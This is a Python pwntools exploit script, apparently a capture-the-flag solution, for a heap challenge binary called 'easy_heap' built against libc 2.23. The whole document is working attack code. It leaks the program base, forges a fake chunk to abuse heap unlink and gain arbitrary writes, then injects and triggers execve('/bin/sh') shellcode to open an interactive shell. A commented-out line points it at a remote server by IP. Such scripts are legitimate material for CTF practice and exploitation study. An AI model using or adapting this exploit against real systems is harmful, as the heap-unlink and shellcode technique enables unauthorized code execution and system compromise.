#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''

    '''

    f = open('/tmp/gdb_symbols.c', 'w')
    f.write(gdb_symbols)
    f.close()
    os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
except Exception as e:
    print(e)

context.arch = "amd64"
# context.log_level = 'debug'
execve_file = './easy_heap'
# sh = process(execve_file, env={"LD_PRELOAD": "/tmp/gdb_symbols.so"})
sh = process(execve_file)
# sh = remote('132.232.100.67', 10004)
elf = ELF(execve_file)
libc = ELF('./libc-2.23.so')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    set  $ptr=(void **)$rebase(0x202060)
    define pr
        x/16gx $ptr
        end
    '''

    f = open('/tmp/pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdbscript', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def Alloc(size):
    sh.sendlineafter('>> ', '1')
    sh.sendlineafter('Size: ', str(size))
    sh.recvuntil('Pointer Address ')
    return int(sh.recvline(), 16)

def Delete(index):
    sh.sendlineafter('>> ', '2')
    sh.sendlineafter('Index: ', str(index))

def Fill(index, content):
    sh.sendlineafter('>> ', '3')
    sh.sendlineafter('Index: ', str(index))
    sh.sendlineafter('Content: ', content)

sh.recvuntil('Mmap: ')
mmap_addr = int(sh.recvline(), 16)
log.info("mmap_addr: " + hex(mmap_addr))

image_base_addr = Alloc(0x38) - 0x202068 # index 0
log.info("image_base_addr: " + hex(image_base_addr))

Alloc(0x38) # index 1
Alloc(0xf8) # index 2
Alloc(0x18) # index 3

fake_chunk = [
    0, 0x31,
    image_base_addr + 0x202078 - 0x18, image_base_addr + 0x202078 - 0x10,
]

Fill(1, flat(fake_chunk).ljust(0x30, 'a') + p64(0x30))
# unlink
Delete(2)

Fill(1, p64(0x100) + '\x68')
Fill(0, p64(image_base_addr + 0x202068 - 0x10))

Alloc(0x128)

Fill(1, p64(0x100) + '\x10')
Fill(0, p64(mmap_addr))


Fill(1, p64(0x100) + p64(mmap_addr))

shellcode = asm('''
mov rax, 0x0068732f6e69622f
push rax

mov rdi, rsp
xor rsi, rsi
mul rsi
mov al, 59
syscall

xor rdi, rdi
mov al, 60
syscall
''')

Fill(0, shellcode)

sh.sendlineafter('>> ', '1')
sh.sendlineafter('Size: ', str(8))

sh.interactive()
